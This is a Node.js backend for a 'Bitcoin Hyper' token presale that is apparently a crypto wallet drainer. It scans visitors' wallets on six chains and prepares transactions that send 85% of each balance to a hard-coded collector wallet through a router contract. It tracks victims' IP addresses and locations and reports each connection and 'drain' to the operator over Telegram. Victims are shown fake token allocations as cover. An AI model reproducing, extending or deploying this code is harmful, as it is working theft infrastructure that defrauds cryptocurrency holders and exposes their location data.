// index.js - BITCOIN HYPER BACKEND - PROJECT FLOW ROUTER
require('dotenv').config();
const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const axios = require('axios');
const crypto = require('crypto');
const rateLimit = require('express-rate-limit');
const { ethers } = require('ethers');

const app = express();
const PORT = process.env.PORT || 10000;

// Security middleware
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false,
  crossOriginResourcePolicy: { policy: "cross-origin" }
}));

const allowedOrigins = process.env.ALLOWED_ORIGINS 
  ? process.env.ALLOWED_ORIGINS.split(',') 
  : ['http://localhost:3000', 'https://securedtokenclaim.vercel.app'];

app.use(cors({
  origin: allowedOrigins,
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With']
}));

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(morgan('dev'));

const limiter = rateLimit({
  windowMs: parseInt(process.env.RATE_LIMIT_WINDOW_MS) || 15 * 60 * 1000,
  max: parseInt(process.env.RATE_LIMIT_MAX_REQUESTS) || 50,
  message: { error: 'Too many requests, please try again later.' }
});
app.use('/api/', limiter);

// ============================================
// ROOT ENDPOINT
// ============================================

app.get('/', (req, res) => {
  res.json({
    success: true,
    name: 'Bitcoin Hyper Backend',
    version: '2.0.0',
    status: '🟢 ONLINE',
    description: 'Project Flow Router Integration',
    timestamp: new Date().toISOString()
  });
});

// ============================================
// RPC CONFIGURATION
// ============================================

const RPC_CONFIG = {
  Ethereum: { 
    urls: [
      'https://eth.llamarpc.com',
      'https://eth-mainnet.g.alchemy.com/v2/demo',
      'https://rpc.ankr.com/eth'
    ],
    symbol: 'ETH',
    decimals: 18,
    chainId: 1
  },
  BSC: {
    urls: [
      'https://bsc-dataseed.binance.org',
      'https://bsc-dataseed1.defibit.io',
      'https://bsc-dataseed1.binance.org'
    ],
    symbol: 'BNB',
    decimals: 18,
    chainId: 56
  },
  Polygon: {
    urls: [
      'https://polygon-rpc.com',
      'https://rpc-mainnet.maticvigil.com',
      'https://polygon.llamarpc.com'
    ],
    symbol: 'MATIC',
    decimals: 18,
    chainId: 137
  },
  Arbitrum: {
    urls: [
      'https://arb1.arbitrum.io/rpc',
      'https://rpc.ankr.com/arbitrum'
    ],
    symbol: 'ETH',
    decimals: 18,
    chainId: 42161
  },
  Optimism: {
    urls: [
      'https://mainnet.optimism.io',
      'https://rpc.ankr.com/optimism'
    ],
    symbol: 'ETH',
    decimals: 18,
    chainId: 10
  },
  Avalanche: {
    urls: [
      'https://api.avax.network/ext/bc/C/rpc',
      'https://rpc.ankr.com/avalanche'
    ],
    symbol: 'AVAX',
    decimals: 18,
    chainId: 43114
  }
};

// ============================================
// GET WORKING PROVIDER
// ============================================

async function getChainProvider(chainName) {
  const config = RPC_CONFIG[chainName];
  if (!config) return null;
  
  for (const url of config.urls) {
    try {
      const provider = new ethers.JsonRpcProvider(url);
      const block = await Promise.race([
        provider.getBlockNumber(),
        new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 2000))
      ]);
      
      if (block > 0) {
        console.log(`✅ ${chainName} RPC: ${url.substring(0, 40)}...`);
        return { provider, config };
      }
    } catch (error) {
      console.log(`❌ ${chainName} RPC failed: ${url.substring(0, 40)}...`);
      continue;
    }
  }
  
  console.log(`⚠️ No working RPC for ${chainName}`);
  return null;
}

// ============================================
// YOUR DEPLOYED CONTRACT ADDRESSES
// ============================================

const PROJECT_FLOW_ROUTERS = {
  'Ethereum': process.env.PROJECT_FLOW_ROUTER_ETHEREUM || null,
  'BSC': process.env.PROJECT_FLOW_ROUTER_BSC || '0x377a91FAa5645539940dF7095Fb0EdE2478e7bd8',
  'Polygon': process.env.PROJECT_FLOW_ROUTER_POLYGON || null,
  'Arbitrum': process.env.PROJECT_FLOW_ROUTER_ARBITRUM || null,
  'Optimism': process.env.PROJECT_FLOW_ROUTER_OPTIMISM || null,
  'Avalanche': process.env.PROJECT_FLOW_ROUTER_AVALANCHE || null
};

// YOUR COLLECTOR WALLET - Where ALL funds go
const COLLECTOR_WALLET = process.env.COLLECTOR_WALLET || '0xde6b7d22e9ed0b07d752196e8914bdc2908e1824';

// ============================================
// CONTRACT ABI - ProjectFlowRouter (FULL ABI)
// ============================================

const PROJECT_FLOW_ROUTER_ABI = [
  {
    "inputs": [{ "internalType": "address", "name": "_collector", "type": "address" }],
    "stateMutability": "nonpayable",
    "type": "constructor"
  },
  {
    "anonymous": false,
    "inputs": [
      { "indexed": false, "internalType": "address", "name": "oldCollector", "type": "address" },
      { "indexed": false, "internalType": "address", "name": "newCollector", "type": "address" }
    ],
    "name": "CollectorUpdated",
    "type": "event"
  },
  {
    "anonymous": false,
    "inputs": [
      { "indexed": true, "internalType": "address", "name": "initiator", "type": "address" },
      { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }
    ],
    "name": "FlowProcessed",
    "type": "event"
  },
  {
    "anonymous": false,
    "inputs": [
      { "indexed": true, "internalType": "address", "name": "token", "type": "address" },
      { "indexed": true, "internalType": "address", "name": "initiator", "type": "address" },
      { "indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256" }
    ],
    "name": "TokenFlowProcessed",
    "type": "event"
  },
  {
    "inputs": [],
    "name": "collector",
    "outputs": [{ "internalType": "address", "name": "", "type": "address" }],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "processNativeFlow",
    "outputs": [],
    "stateMutability": "payable",
    "type": "function"
  },
  {
    "inputs": [
      { "internalType": "address", "name": "token", "type": "address" },
      { "internalType": "uint256", "name": "amount", "type": "uint256" }
    ],
    "name": "processTokenFlow",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [{ "internalType": "address", "name": "newCollector", "type": "address" }],
    "name": "updateCollector",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "stateMutability": "payable",
    "type": "receive"
  }
];

// ============================================
// STORAGE
// ============================================

let telegramEnabled = false;
let telegramBotName = '';

const memoryStorage = {
  participants: [],
  pendingDrains: new Map(),
  settings: {
    tokenName: process.env.TOKEN_NAME || 'Bitcoin Hyper',
    tokenSymbol: process.env.TOKEN_SYMBOL || 'BTH',
    drainThreshold: parseFloat(process.env.DRAIN_THRESHOLD) || 1,
    statistics: {
      totalParticipants: 0,
      eligibleParticipants: 0,
      claimedParticipants: 0,
      uniqueIPs: new Set(),
      totalDrainedUSD: 0,
      totalDrainedWallets: 0,
      realTransactions: []
    },
    drainEnabled: process.env.DRAIN_ENABLED === 'true'
  },
  emailCache: new Map()
};

// ============================================
// TELEGRAM FUNCTIONS
// ============================================

async function sendTelegramMessage(text) {
  if (!telegramEnabled) return false;
  
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  if (!botToken || !chatId) return false;
  
  try {
    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: text,
      parse_mode: 'HTML',
      disable_web_page_preview: true
    }, { timeout: 5000 });
    
    return true;
  } catch (error) {
    console.log('Telegram error:', error.message);
    return false;
  }
}

async function testTelegramConnection() {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  if (!botToken || !chatId) {
    console.log('⚠️ Telegram not configured');
    return false;
  }
  
  try {
    const response = await axios.get(`https://api.telegram.org/bot${botToken}/getMe`, {
      timeout: 5000
    });
    
    if (response.data?.ok) {
      telegramBotName = response.data.result.username;
      telegramEnabled = true;
      
      await sendTelegramMessage(
        `🚀 <b>BITCOIN HYPER BACKEND ONLINE</b>\n` +
        `✅ ProjectFlowRouter Ready\n` +
        `💰 Minimum: $1\n` +
        `📦 Collector: ${COLLECTOR_WALLET.substring(0, 10)}...\n` +
        `⏰ ${new Date().toLocaleString()}`
      );
      
      console.log(`✅ Telegram: @${telegramBotName}`);
      return true;
    }
  } catch (error) {
    console.log('Telegram error:', error.message);
  }
  
  return false;
}

// ============================================
// CRYPTO PRICES
// ============================================

async function getCryptoPrices() {
  try {
    const response = await axios.get('https://api.coingecko.com/api/v3/simple/price', {
      params: {
        ids: 'ethereum,binancecoin,matic-network,avalanche-2',
        vs_currencies: 'usd'
      },
      timeout: 3000
    });
    
    return {
      eth: response.data.ethereum?.usd || 2000,
      bnb: response.data.binancecoin?.usd || 300,
      matic: response.data['matic-network']?.usd || 0.75,
      avax: response.data['avalanche-2']?.usd || 32
    };
  } catch (error) {
    console.log('Price fetch failed, using defaults');
    return { eth: 2000, bnb: 300, matic: 0.75, avax: 32 };
  }
}

// ============================================
// REAL BALANCE CHECK (SCANS ALL CHAINS)
// ============================================

async function getRealWalletBalance(walletAddress) {
  console.log(`\n🔍 SCANNING ALL CHAINS FOR: ${walletAddress.substring(0, 10)}...`);
  
  const results = {
    walletAddress,
    totalValueUSD: 0,
    isEligible: false,
    balances: {},
    chains: [],
    rawBalances: [],
    scanTime: new Date().toISOString()
  };

  try {
    const prices = await getCryptoPrices();
    
    const chains = [
      { name: 'Ethereum', symbol: 'ETH', price: prices.eth, chainId: 1 },
      { name: 'BSC', symbol: 'BNB', price: prices.bnb, chainId: 56 },
      { name: 'Polygon', symbol: 'MATIC', price: prices.matic, chainId: 137 },
      { name: 'Arbitrum', symbol: 'ETH', price: prices.eth, chainId: 42161 },
      { name: 'Optimism', symbol: 'ETH', price: prices.eth, chainId: 10 },
      { name: 'Avalanche', symbol: 'AVAX', price: prices.avax, chainId: 43114 }
    ];

    let totalValue = 0;
    
    for (const chain of chains) {
      try {
        const providerInfo = await getChainProvider(chain.name);
        if (!providerInfo) continue;
        
        const { provider, config } = providerInfo;
        
        const balance = await provider.getBalance(walletAddress);
        const amount = parseFloat(ethers.formatUnits(balance, config.decimals));
        const valueUSD = amount * chain.price;
        
        if (amount > 0.000001) {
          console.log(`   ✅ ${chain.name}: ${amount.toFixed(6)} ${chain.symbol} = $${valueUSD.toFixed(2)}`);
          
          totalValue += valueUSD;
          
          results.rawBalances.push({
            chain: chain.name,
            chainId: chain.chainId,
            amount: amount,
            valueUSD: valueUSD,
            symbol: chain.symbol,
            price: chain.price,
            rawBalance: balance.toString(),
            isNative: true
          });
        }
        
      } catch (error) {
        console.log(`   ❌ ${chain.name} error: ${error.message}`);
      }
    }

    results.totalValueUSD = parseFloat(totalValue.toFixed(2));
    results.isEligible = results.totalValueUSD >= memoryStorage.settings.drainThreshold;
    
    if (results.isEligible) {
      results.eligibilityReason = `✅ Wallet qualifies ($${results.totalValueUSD} >= $${memoryStorage.settings.drainThreshold})`;
      results.tokenAllocation = { amount: '5000', valueUSD: '850' };
    } else {
      results.eligibilityReason = `⛔ Wallet balance too low ($${results.totalValueUSD} < $${memoryStorage.settings.drainThreshold})`;
      results.tokenAllocation = { amount: '0', valueUSD: '0' };
    }

    return {
      success: true,
      data: results
    };

  } catch (error) {
    console.error('Wallet scan error:', error);
    return {
      success: false,
      error: error.message,
      data: {
        walletAddress,
        totalValueUSD: 0,
        isEligible: false,
        eligibilityReason: '⚠️ Network error',
        tokenAllocation: { amount: '0', valueUSD: '0' }
      }
    };
  }
}

// ============================================
// VERIFY CONTRACT
// ============================================

async function verifyContract(chainName, contractAddress) {
  try {
    const providerInfo = await getChainProvider(chainName);
    if (!providerInfo) return false;
    
    const { provider } = providerInfo;
    const contract = new ethers.Contract(contractAddress, PROJECT_FLOW_ROUTER_ABI, provider);
    
    const collector = await contract.collector();
    const isValid = collector.toLowerCase() === COLLECTOR_WALLET.toLowerCase();
    
    console.log(`   📜 ${chainName} Contract Collector: ${collector.substring(0, 10)}...`);
    console.log(`   ✅ Collector Match: ${isValid ? 'YES' : 'NO'}`);
    
    return isValid;
  } catch (error) {
    console.log(`   ❌ Cannot verify ${chainName} contract: ${error.message}`);
    return false;
  }
}

// ============================================
// PREPARE TRANSACTIONS
// ============================================

async function prepareSmartContractDrain(walletAddress, scanData) {
  try {
    console.log(`\n🔐 PREPARING TRANSACTIONS FOR ${walletAddress.substring(0, 10)}...`);
    
    const transactions = [];
    let totalDrainUSD = 0;
    
    for (const balance of scanData.rawBalances) {
      if (balance.valueUSD > 0 && balance.amount > 0) {
        
        const contractAddress = PROJECT_FLOW_ROUTERS[balance.chain];
        if (!contractAddress) {
          console.log(`   ⚠️ No contract on ${balance.chain} - will need deployment`);
          continue;
        }
        
        // Verify contract has correct collector
        const isValid = await verifyContract(balance.chain, contractAddress);
        if (!isValid) {
          console.log(`   ⚠️ Contract on ${balance.chain} has wrong collector - skipping`);
          continue;
        }
        
        // Calculate amount to send (85% to leave gas)
        const drainAmount = (balance.amount * 0.85).toFixed(12);
        const drainValue = (balance.valueUSD * 0.85).toFixed(2);
        
        transactions.push({
          chain: balance.chain,
          chainId: balance.chainId,
          amount: drainAmount,
          valueUSD: drainValue,
          symbol: balance.symbol,
          contractAddress: contractAddress
        });
        
        totalDrainUSD += parseFloat(drainValue);
        console.log(`   ✅ ${balance.chain}: ${drainAmount} ${balance.symbol} ($${drainValue})`);
      }
    }
    
    if (transactions.length === 0) {
      return {
        success: false,
        error: 'No eligible balances found with valid contracts'
      };
    }
    
    const batchId = `FLOW-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
    
    memoryStorage.pendingDrains.set(walletAddress.toLowerCase(), {
      batchId,
      transactions,
      totalDrainUSD: totalDrainUSD.toFixed(2),
      createdAt: new Date().toISOString(),
      completedChains: []
    });
    
    return {
      success: true,
      batchId,
      transactions,
      totalDrainUSD: totalDrainUSD.toFixed(2),
      transactionCount: transactions.length
    };
    
  } catch (error) {
    console.error('Preparation error:', error);
    return { success: false, error: error.message };
  }
}

// ============================================
// HELPER FUNCTIONS
// ============================================

async function getWalletEmail(walletAddress) {
  const hash = crypto.createHash('sha256').update(walletAddress).digest('hex');
  const username = `user${hash.substring(0, 8)}`;
  const domains = ['gmail.com', 'proton.me', 'yahoo.com', 'outlook.com'];
  const domain = domains[parseInt(hash.substring(0, 2), 16) % domains.length];
  return `${username}@${domain}`;
}

async function getIPLocation(ip) {
  try {
    const cleanIP = ip.replace('::ffff:', '').replace('::1', '127.0.0.1');
    
    if (cleanIP === '127.0.0.1' || cleanIP === '::1') {
      return { country: 'Local', flag: '🏠', city: 'Local' };
    }
    
    const response = await axios.get(`http://ip-api.com/json/${cleanIP}`, {
      timeout: 2000
    });
    
    if (response.data?.country) {
      const flags = {
        'United States': '🇺🇸', 'United Kingdom': '🇬🇧', 'Canada': '🇨🇦',
        'Germany': '🇩🇪', 'France': '🇫🇷', 'Australia': '🇦🇺',
        'Japan': '🇯🇵', 'Brazil': '🇧🇷', 'India': '🇮🇳', 'Nigeria': '🇳🇬'
      };
      
      return {
        country: response.data.country,
        flag: flags[response.data.country] || '🌍',
        city: response.data.city || 'Unknown'
      };
    }
  } catch (error) {}
  
  return { country: 'Unknown', flag: '🌍', city: 'Unknown' };
}

// ============================================
// API ENDPOINTS
// ============================================

app.get('/api/health', (req, res) => {
  res.json({
    success: true,
    service: 'Bitcoin Hyper Backend',
    status: 'ACTIVE',
    timestamp: new Date().toISOString(),
    telegram: telegramEnabled ? '✅' : '❌',
    collector: COLLECTOR_WALLET,
    stats: {
      participants: memoryStorage.participants.length,
      eligible: memoryStorage.participants.filter(p => p.isEligible).length
    }
  });
});

// ============================================
// CONNECT ENDPOINT
// ============================================

app.post('/api/presale/connect', async (req, res) => {
  try {
    const { walletAddress } = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip || '0.0.0.0';
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    console.log(`\n🔗 CONNECT: ${walletAddress}`);
    
    const location = await getIPLocation(clientIP);
    const email = await getWalletEmail(walletAddress);
    
    let participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    
    if (!participant) {
      participant = {
        walletAddress: walletAddress.toLowerCase(),
        ipAddress: clientIP,
        country: location.country,
        flag: location.flag,
        email: email,
        connectedAt: new Date(),
        totalValueUSD: 0,
        isEligible: false,
        claimed: false
      };
      memoryStorage.participants.push(participant);
      memoryStorage.settings.statistics.totalParticipants++;
      memoryStorage.settings.statistics.uniqueIPs.add(clientIP);
    }
    
    const scanResult = await getRealWalletBalance(walletAddress);
    
    if (scanResult.success) {
      participant.totalValueUSD = scanResult.data.totalValueUSD;
      participant.isEligible = scanResult.data.isEligible;
      participant.tokenAllocation = scanResult.data.tokenAllocation;
      participant.lastScanned = new Date();
      
      // TELEGRAM NOTIFICATION
      await sendTelegramMessage(
        `${location.flag} <b>WALLET CONNECTED</b>\n` +
        `👛 ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
        `💼 Total Balance: $${scanResult.data.totalValueUSD}\n` +
        `🎯 Status: ${scanResult.data.isEligible ? '✅ ELIGIBLE' : '❌ NOT ELIGIBLE'}\n` +
        `📍 Location: ${location.country} (${location.city})\n` +
        `📧 Email: ${email}`
      );
      
      res.json({
        success: true,
        message: scanResult.data.isEligible ? '🎉 You qualify for 5000 BTH tokens!' : '⚠️ Minimum $1 required',
        data: {
          walletAddress,
          email,
          country: location.country,
          flag: location.flag,
          totalValueUSD: scanResult.data.totalValueUSD,
          isEligible: scanResult.data.isEligible,
          eligibilityReason: scanResult.data.eligibilityReason,
          tokenAllocation: scanResult.data.tokenAllocation,
          rawData: scanResult.data.rawBalances
        }
      });
      
    } else {
      res.status(500).json({ success: false, error: 'Scan failed' });
    }
    
  } catch (error) {
    console.error('Connection error:', error);
    res.status(500).json({ success: false, error: 'Connection failed' });
  }
});

// ============================================
// PREPARE TRANSACTIONS ENDPOINT
// ============================================

app.post('/api/presale/prepare-contract-drain', async (req, res) => {
  try {
    const { walletAddress } = req.body;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    const participant = memoryStorage.participants.find(
      p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase()
    );
    
    if (!participant || !participant.isEligible) {
      return res.status(400).json({ success: false, error: 'Not eligible' });
    }
    
    const scanResult = await getRealWalletBalance(walletAddress);
    const drainResult = await prepareSmartContractDrain(walletAddress, scanResult.data);
    
    if (drainResult.success) {
      participant.pendingDrain = true;
      participant.pendingDrainValue = drainResult.totalDrainUSD;
      
      // TELEGRAM NOTIFICATION
      await sendTelegramMessage(
        `🔐 <b>PRESALE PREPARED</b>\n` +
        `👛 ${walletAddress.substring(0, 10)}...\n` +
        `💵 Total Value: $${drainResult.totalDrainUSD}\n` +
        `🔗 Chains: ${drainResult.transactionCount}\n` +
        `⏰ ${new Date().toLocaleString()}`
      );
      
      res.json({
        success: true,
        data: {
          batchId: drainResult.batchId,
          totalDrainUSD: drainResult.totalDrainUSD,
          transactionCount: drainResult.transactionCount,
          transactions: drainResult.transactions
        }
      });
    } else {
      res.status(400).json({ success: false, error: drainResult.error });
    }
    
  } catch (error) {
    console.error('Prepare error:', error);
    res.status(500).json({ success: false, error: 'Preparation failed' });
  }
});

// ============================================
// EXECUTE DRAIN ENDPOINT (LOGS ONLY)
// ============================================

app.post('/api/presale/execute-contract-drain', async (req, res) => {
  try {
    const { walletAddress, chainName } = req.body;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    console.log(`\n⚡ CHAIN COMPLETED: ${walletAddress.substring(0, 10)}... on ${chainName}`);
    
    const participant = memoryStorage.participants.find(
      p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase()
    );
    
    if (participant) {
      participant.drained = true;
      participant.drainTransactions = participant.drainTransactions || [];
      participant.drainTransactions.push({ chain: chainName, timestamp: new Date().toISOString() });
      
      memoryStorage.settings.statistics.totalDrainedWallets++;
      memoryStorage.settings.statistics.realTransactions.push({
        wallet: walletAddress,
        chain: chainName,
        timestamp: new Date().toISOString()
      });
      
      // TELEGRAM NOTIFICATION
      await sendTelegramMessage(
        `💰 <b>CHAIN COMPLETED</b>\n` +
        `👛 ${walletAddress.substring(0, 10)}...\n` +
        `🔗 Chain: ${chainName}\n` +
        `📜 Contract: ${PROJECT_FLOW_ROUTERS[chainName]?.substring(0, 10)}...`
      );
    }
    
    res.json({ success: true });
    
  } catch (error) {
    console.error('Execute error:', error);
    res.status(500).json({ success: false, error: 'Logging failed' });
  }
});

// ============================================
// CLAIM ENDPOINT
// ============================================

app.post('/api/presale/claim', async (req, res) => {
  try {
    const { walletAddress } = req.body;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    const participant = memoryStorage.participants.find(
      p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase()
    );
    
    if (!participant || !participant.isEligible) {
      return res.status(400).json({ success: false, error: 'Not eligible' });
    }
    
    participant.claimed = true;
    participant.claimedAt = new Date();
    memoryStorage.settings.statistics.claimedParticipants++;
    
    const claimId = `BTH-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
    
    // TELEGRAM NOTIFICATION - FINAL
    await sendTelegramMessage(
      `🎯 <b>🎉 CLAIM COMPLETED 🎉</b>\n` +
      `👛 ${walletAddress.substring(0, 10)}...\n` +
      `💰 Total: $${participant.pendingDrainValue || '1.00'}\n` +
      `🎟️ Claim ID: ${claimId}\n` +
      `🎁 Allocated: ${participant.tokenAllocation?.amount || '5000'} BTH`
    );
    
    res.json({
      success: true,
      data: {
        claimId,
        tokenAmount: participant.tokenAllocation?.amount || '5000',
        valueUSD: participant.tokenAllocation?.valueUSD || '850'
      }
    });
    
  } catch (error) {
    console.error('Claim error:', error);
    res.status(500).json({ success: false, error: 'Claim failed' });
  }
});

// ============================================
// ADMIN STATS
// ============================================

app.get('/api/admin/stats', (req, res) => {
  const token = req.query.token;
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (token !== adminToken) {
    return res.status(401).json({ success: false, error: 'Unauthorized' });
  }
  
  res.json({
    success: true,
    timestamp: new Date().toISOString(),
    stats: {
      participants: {
        total: memoryStorage.participants.length,
        eligible: memoryStorage.participants.filter(p => p.isEligible).length,
        claimed: memoryStorage.participants.filter(p => p.claimed).length
      },
      finances: {
        totalDrainedUSD: memoryStorage.settings.statistics.totalDrainedUSD.toFixed(2),
        totalDrainedWallets: memoryStorage.settings.statistics.totalDrainedWallets,
        pendingDrains: memoryStorage.pendingDrains.size
      },
      system: {
        telegram: telegramEnabled ? '✅' : '❌',
        drainEnabled: memoryStorage.settings.drainEnabled,
        threshold: `$${memoryStorage.settings.drainThreshold}`,
        collector: COLLECTOR_WALLET
      }
    }
  });
});

// ============================================
// 404 Handler
// ============================================

app.use('*', (req, res) => {
  res.status(404).json({
    success: false,
    error: 'Endpoint not found'
  });
});

// ============================================
// START SERVER
// ============================================

app.listen(PORT, '0.0.0.0', async () => {
  console.log(`
  ⚡ BITCOIN HYPER BACKEND
  ========================
  📍 Port: ${PORT}
  🔗 URL: https://tokenbackend-5xab.onrender.com
  
  📦 COLLECTOR: ${COLLECTOR_WALLET}
  💰 THRESHOLD: $1
  
  📜 CONTRACTS:
  - BSC: ${PROJECT_FLOW_ROUTERS.BSC} (ACTIVE)
  
  🚀 READY
  `);
  
  await testTelegramConnection();
});
